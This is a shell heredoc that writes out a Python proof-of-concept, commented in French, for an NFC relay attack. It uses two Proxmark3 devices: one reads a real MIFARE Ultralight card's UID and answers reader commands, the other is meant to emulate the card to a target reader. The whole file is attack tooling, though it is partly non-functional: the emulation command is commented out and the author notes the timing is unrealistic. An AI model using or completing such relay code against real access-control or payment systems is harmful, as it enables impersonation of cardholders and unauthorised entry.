cat << 'EOF' > pm3_relay_poc.py
import subprocess
import time
import re
import sys

#Dans ce code, je fait beaucoup de time.sleep pour laisser le temps au proxmark de tout filtrer et tout
#C'est pas très réaliste en terme de gestion de temps mais voila


# CONFIGURATION
PM3_PATH = "./client/proxmark3.exe"
PROXY_PORT = "COM9" #Mon pc est sur windows, donc a modifier si linux
MOLE_PORT = "COM10"

class PM3Process:
    def __init__(self, port):
        self.process = subprocess.Popen( #Plus rapide de faire un Popen et de communiquer via stdin/stdout que de relancer un subprocess.run à chaque commande
            [PM3_PATH, port],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        print(f"[*] Connecté au port {port}")

    def send(self, cmd): #envoi de commande au proxmark3 via stdin
        self.process.stdin.write(cmd + "\n")
        self.process.stdin.flush()

    def read_until(self, pattern): #réception de la sortie du proxmark3 jusqu'à trouver une ligne contenant le pattern
        while True:
            line = self.process.stdout.readline()
            if not line: break
            if pattern in line:
                return line
        return None
    
    def flush_output(self):
        """Vide le buffer de démarrage pour ne pas lire la bannière."""
        time.sleep(1)
        # On lit tout ce qui est disponible actuellement sans bloquer
        while True:
            import msvcrt
            if not msvcrt.kbhit(): # Spécifique Windows pour vérifier si des touches/data attendent
                break
            self.process.stdout.readline()

def start_relay():
    print("=== POC RELAI PROXMARK3 ULTRALIGHT ===")
    
    # 1. Initialisation des instances
    proxy = PM3Process(PROXY_PORT)
    mole = PM3Process(MOLE_PORT)
    time.sleep(3) # Temps pour l'initialisation hardware
    print("[*] Nettoyage des buffers de démarrage...")
    proxy.flush_output()
    mole.flush_output()
    time.sleep(1)

    # 2. Préparation du Mole (lecture UID carte originale)
    print("[*] Initialisation du Mole sur la vraie carte...")
    mole.send("script run hf_mole_relay")
    ready_line = mole.read_until("READY:")
    
    if not ready_line:
        print("[!] Erreur : Impossible de détecter la carte sur COM10")
        return
    
    uid = ready_line.split("READY:")[1].strip()
    print(f"[+] Carte détectée ! UID: {uid}")

    time.sleep(1)
    # 3. Préparation du Proxy (Simulation de l'UID)
    print(f"[*] Simulation de l'UID {uid} sur le Proxy...")
    #proxy.send(f"hf 14a sim -t 7 -v -u {uid}") 
    print("[*] Mode simulation actif. En attente du lecteur cible...")

    # 4. Boucle de relai temps réel
    try:
        print("[*] Relai actif. En attente du lecteur...")
        while True:
            print("[*] Surveillance du Proxy...")
            # On surveille le Proxy pour les trames du lecteur
            line = proxy.process.stdout.readline()
            if not line : continue
            print(f"DEBUG PROXY: '{line.strip()}'")
            
            
            line_up = line.upper()
            if "SESSION LOG" in line_up or "LOADED" in line_up or "PREFERENCES" in line_up:
                continue
            
            # Recherche d'une trame hexadécimale reçue par le simulateur
            match = re.search(r'([0-9A-F]{4,})', line.upper())
            print(f"DEBUG MATCH: '{line.strip()}' -> MATCH: {match.group(1) if match else 'None'}")
            #c'est une commande et pas un résultat de simulation ou une info du proxmark
            if match and "READY" not in line and "RES" not in line:
                reader_cmd = match.group(1)
                print(f"DEBUG BRUT: '{line.strip()}' -> EXTRAIT: {reader_cmd}")
                
                #if reader_cmd == uid or "SIM" in line.upper() or "PM3 -->" in line.upper():
                #    continue
                
                # Éviter de relayer les trames d'anti-collision déjà gérées par 'sim'
                # if reader_cmd in ["26", "52", "9320", "9370"]:
                #     continue

                print(f" Lecteur -> [Proxy]: {reader_cmd}")
                # Transmission au Mole via notre script Lua
                mole.send(f"script run hf_mole_relay -x {reader_cmd}")
                # Capture de la réponse de la vraie carte
                res_line = mole.read_until("RES:")
                if res_line:
                    tag_res = res_line.split("RES:")[1].strip()
                    print(f" [Mole] -> Carte: {tag_res}")

                    # Injection de la réponse dans le simulateur Proxy
                    # Note : Nécessite un firmware supportant hf 14a raw pour répondre en sim
                    proxy.send(f"hf 14a raw {tag_res}")
                


    except KeyboardInterrupt:
        print("\n[*] Arrêt du POC...")
    finally:
        proxy.process.terminate()
        mole.process.terminate()

if __name__ == "__main__":
    start_relay()
EOF